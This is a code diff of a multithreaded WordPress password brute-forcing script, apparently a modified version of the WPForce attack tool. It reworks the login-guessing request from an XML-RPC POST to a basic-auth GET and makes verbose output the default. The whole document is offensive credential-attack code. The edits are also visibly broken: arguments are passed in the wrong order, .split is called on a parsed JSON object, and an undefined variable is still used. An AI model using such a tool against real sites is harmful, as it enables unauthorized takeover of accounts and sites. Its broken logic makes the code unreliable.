@@ -2,10 +2,11 @@ import re
 import sys
 import time
 import socket
+import requests
 import urllib.request as request
 import argparse
 import threading
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlencode, quote_plus
 
 __author__ = 'n00py'
 # These variables must be shared by all threads dynamically
@@ -52,7 +53,7 @@ def slice_list(input, size):
 
 
 
-def worker(wordlist,thread_no,url,args,userlist):
+def worker(wordlist,i, args,userlist):
     global total
     global correct_pairs
     for n in wordlist:
@@ -64,11 +65,11 @@ def worker(wordlist,thread_no,url,args,userlist):
             if user not in correct_pairs:
                 if user != "":
                     if password != "":
-                        PasswordAttempt(user,password,url.encode("ascii"),thread_no, args.verbose, args.debug, args.agent, args)
+                        PasswordAttempt(user,password,i, args)
         total += 1
 
 
-def BuildThreads(list_array,url,args, userlist):
+def BuildThreads(list_array,args, userlist):
     if args.debug:
         print("Here is the content of the wordlists for each thread")
         for i in range(len(list_array)):
@@ -77,13 +78,13 @@ def BuildThreads(list_array,url,args, userlist):
             print("\n-----------------------------------------------------")
     threads = []
     for i in range(len(list_array)):
-        t = threading.Thread(target=worker, args=(list_array[i], i, url, args, userlist))
+        t = threading.Thread(target=worker, args=(list_array[i], i, args, userlist))
         t.daemon = True
         threads.append(t)
         t.start()
 
 
-def PrintBanner(input,wordlist,url,userlist,passlist):
+def PrintBanner(input,wordlist,url,userlist):
     banner = """\
        ,-~~-.___.       __        __ ____   _____
       / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
@@ -122,22 +123,25 @@ def TestSite(url):
         sys.exit()
 
 
-def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent, args):
-    global passlist
-    if verbose is True or debug is True:
-        if debug is True:
+def PasswordAttempt(user, thread_no, password, args):
+    password = str(password)
+    if args.verbose is True or args.debug is True:
+        if args.debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
         print("Trying " + user + " : " + password + "\n" )
-    headers = {'User-Agent': agent ,
+    headers = {'User-Agent': args.agent ,
                'Connection': 'keep-alive' ,
                'Accept': 'text/html' 
                } 
-    post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
+    post = {"methodName" : "wp.getUsersBlogs",
+            "username": user,
+            "password": password}
     try:
-        req = request.Request(url, post.encode('ascii'), headers)
-        response = request.urlopen(req, timeout=3)
-        the_page = response.read()
+        #req = request.Request(args.url, urlencode(post, quote_via=quote_plus), headers)
+        response = requests.get(args.url, auth=(post["username"], post["password"]))
+        print(response)
+        the_page = response.json()
         look_for = "isAdmin"
         try:
             splitter = the_page.split(look_for, 1)[1]
@@ -161,12 +165,12 @@ def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent, args):
             sys.exit()
         else:
             printout(str(e), YELLOW)
-            print(" - Try reducing Thread count ")
+            print(" - Try reducing Thread count 1")
             if args.verbose is True or args.debug is True:
                 print(user + ":" + password + " was skipped")
     except socket.timeout as e:
         printout(str(e), YELLOW)
-        print(" - Try reducing Thread count ")
+        print(" - Try reducing Thread count 2")
         if args.verbose is True or args.debug is True:
             print(user + ":" + password + " was skipped")
     except socket.error as e:
@@ -189,7 +193,7 @@ def main():
     users.add_argument('-si' '--singleinput', help='Input list of users', action='store', dest='singleinput', nargs='+')
     parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
     parser.add_argument('-u','--url',help='URL of target', required=True)
-    parser.add_argument('-v','--verbose',help=' Verbose output.  Show the attemps as they happen.', required=False, action='store_true')
+    parser.add_argument('-v','--verbose',help=' Verbose output.  Show the attemps as they happen.', required=False, action='store_true', default=True)
     parser.add_argument('-t','--threads',help=' Determines the number of threads to be used, default is 10', type=int, default=10, required=False)
     parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
     parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
@@ -205,14 +209,14 @@ def main():
         userlist = args.singleinput
 
     totalusers = len(userlist)
-
+    global passlist
     passlist = open(args.wordlist, 'r').read().split('\n')
     
-    PrintBanner(args.input,args.wordlist,args.url,userlist,passlist)
+    PrintBanner(args.input,args.wordlist,args.url,userlist)
     TestSite(url)
 
     list_array = slice_list(passlist, args.threads)
-    BuildThreads(list_array,url,args, userlist)
+    BuildThreads(list_array,args, userlist)
     while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
             time.sleep(0.1)
             sys.stdout.flush()
@@ -225,3 +229,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
